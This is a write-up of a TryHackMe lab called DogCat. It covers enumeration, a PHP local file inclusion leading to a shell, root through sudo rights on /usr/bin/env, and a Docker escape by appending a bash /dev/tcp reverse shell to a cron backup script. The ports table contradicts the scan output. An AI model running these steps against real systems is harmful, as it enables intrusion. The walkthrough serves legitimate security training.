---
title: "DogCat CTF"
image: /room_image.webp
categories: [CTFs ,Tryhackme]
tags: []
media_subpath: /images/dogcat-ctf
author: <author_id>
---

This Capture the Flag (CTF) challenge invites participants to explore and exploit a **PHP-based** web application designed to showcase images of cats and dogs, uncovering vulnerabilities beneath its seemingly benign exterior. Your objective is to identify and leverage a **Local File Inclusion** (LFI) flaw, enabling access to sensitive files and deeper system insights. Beyond this, you must demonstrate advanced exploitation skills by escaping the constraints of a **Docker** containerized environment, simulating real-world scenarios where attackers pivot from web-layer vulnerabilities to host-level exploitation. This challenge sharpens skills in web application security, container escape techniques, and lateral movement in constrained environments.

----

## **Enumeration - Nmap Scan**

```console
root@ip-10-10-250-210:~# nmap -n -sC -sV -p- -T4 10.10.234.138

Starting Nmap 7.60 ( https://nmap.org ) at 2024-11-18 15:06 GMT

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)
|   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)
|_  256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (EdDSA)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: dogcat
MAC Address: 02:09:A9:08:AE:5B (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 15:26
Completed NSE at 15:26, 0.00s elapsed
Initiating NSE at 15:26
Completed NSE at 15:26, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1227.11 seconds
           Raw packets sent: 125333 (5.515MB) | Rcvd: 355432 (58.904MB)
```
### **Open Ports**

| Ports | Services | Version                      |
| ----- | -------- | ---------------------------- |
| 22    | SSH      | OpenSSH 8.2  Ubuntu          |
| 80    | HTTP     | SimpleHTTP/0.6 Python/3.11.2 |

![Desktop View](/webpage-80.webp){: width="1200" height="450" }

Let's see the code source of the pages you can use inspector in the web browser or just used `view-source:<URL>` example view-source:example.com

![Desktop View](/source-code.webp){: width="1200" height="450" }

{% include embed/video.html src='/explained-video.mp4' loop=true %}

## **WebPage Enumeration**

```console
root@ip-10-10-250-210:~# whatweb http://10.10.234.138
http://10.10.234.138 [200 OK] Apache[2.4.38], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[10.10.234.138], PHP[7.4.3], Title[dogcat], X-Powered-By[PHP/7.4.3]
```

> you can use Wappalyzer : extension used to identify the technologies powering websites
{: .prompt-tip}

**Information :**
1. Apache[2.4.38]
2. HTTPServer[Debian Linux]
3. PHP[7.4.3]

> you can do some research about this information to find if there are any vulns can you used
{: .prompt-tip}


## **Reverse Shell From LFI**

![Desktop View](/ls-dogcat-ctf.webp){: width="1200" height="450" }
![Desktop View](/reverse-shell-dogcat-ctf.webp){: width="1200" height="450" }

```console 
www-data@1e8fecd5cd10:/var/www/html$ ls
ls
cat.php
cats
dog.php
dogs
flag.php
index.php
style.css
www-data@1e8fecd5cd10:/var/www/html$ cat flag.php
cat flag.php
<?php
$flag_1 = "THM{**********************}"
?>
www-data@1e8fecd5cd10:/var/www/html$ cd ..
www-data@1e8fecd5cd10:/var/www/html$ ls
flag2_QMW7JvaY2LvK.txt

```

```console
www-data@1e8fecd5cd10:/var/www/html$ sudo -l
sudo -l
Matching Defaults entries for www-data on 1e8fecd5cd10:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on 1e8fecd5cd10:
    (root) NOPASSWD: /usr/bin/env

```

```console
www-data@1e8fecd5cd10:/var/www/html$ sudo /usr/bin/env /bin/bash

pwd
/root
ls      
flag3.txt
cat flag3.txt

```
```console
ls -al
.
..
.dockerenv
...

```

```console
ls opt
backups
cd opt/backups
ls
backup.sh
backup.tar
cat backup.sh
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container
```
So now we just need another reverse shell after we need to add `echo "bash -i >& /dev/tcp/<IP_attacker>/<Port> 0>&1" backup.sh"`
 
 ```console 
 root@dogcat:~# ls
 ls
container
flag4.txt
cat flag4.txt
```